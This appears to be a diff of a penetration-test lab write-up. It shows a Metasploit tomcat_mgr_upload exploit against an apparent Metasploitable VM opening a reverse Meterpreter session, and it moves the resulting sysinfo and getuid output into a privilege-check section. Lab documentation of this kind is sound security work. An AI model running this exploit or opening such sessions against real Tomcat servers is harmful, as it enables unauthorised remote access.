@@ -233,14 +233,7 @@ msf exploit(multi/http/tomcat_mgr_upload) > run
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
 [*] Meterpreter session 1 opened (192.168.56.3:4444 -> 192.168.56.5:37998) at 2026-01-06 04:55:45 -0500
 
-meterpreter > sysinfo
-Computer        : metasploitable
-OS              : Linux 2.6.24-16-server (i386)
-Architecture    : x86
-System Language : en_US
-Meterpreter     : java/linux
-meterpreter > getuid
-Server username: tomcat55
+meterpreter > 
 
 
 ```
@@ -254,7 +247,14 @@ critical severity impact.
 ### Activities
 Verification of privilege level
 ```
-priv check needed
+meterpreter > sysinfo
+Computer        : metasploitable
+OS              : Linux 2.6.24-16-server (i386)
+Architecture    : x86
+System Language : en_US
+Meterpreter     : java/linux
+meterpreter > getuid
+Server username: tomcat55
 ```
 
 ### Outcome
